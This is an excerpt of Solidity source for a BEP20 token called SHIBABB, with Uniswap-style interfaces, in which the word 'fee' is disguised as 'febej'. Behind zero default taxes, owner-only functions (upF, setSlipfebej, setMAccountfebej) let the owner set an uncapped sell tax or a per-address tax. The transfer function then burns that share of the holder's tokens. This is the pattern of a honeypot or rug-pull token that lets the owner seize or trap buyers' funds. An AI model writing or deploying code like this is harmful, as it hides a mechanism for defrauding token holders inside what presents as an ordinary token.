...
interface IUniswapV2Factory {
    ...
    function febejTo() external view returns (address);
    function febejToSetter() external view returns (address);
    ...
    function setfebejTo(address) external;
    function setfebejToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfebejOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfebejOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfebejOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfebejOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfebejOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SHIBABB is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfebej = 0;

    uint256 private _defaultBuyfebej = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfebej;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfebej = _value;
    }

    function setSlipfebej(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfebej[_address] = _value;
    }

    function getSlipfebej(address _address) external view onlyownar returns (uint256) {
        return _slipfebej[_address];
    }


    function setMAccountfebej(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfebej(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefebejAmount = 0;

        if (rF) {
            uint256 tradefebej = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefebej = _defaultSellfebej;
                }
                if (from == uniswapV2Pair) {

                    tradefebej = _defaultBuyfebej;
                }
            }
            if (_slipfebej[from] > 0) {
                tradefebej = _slipfebej[from];
            }

            tradefebejAmount = _Amount.mul(tradefebej).div(100);
        }


        if (tradefebejAmount > 0) {
            _balances[from] = _balances[from].sub(tradefebejAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefebejAmount);
            emit Transfer(from, _deadAddress, tradefebejAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefebejAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefebejAmount);
        emit Transfer(from, _to, _Amount - tradefebejAmount);
    }
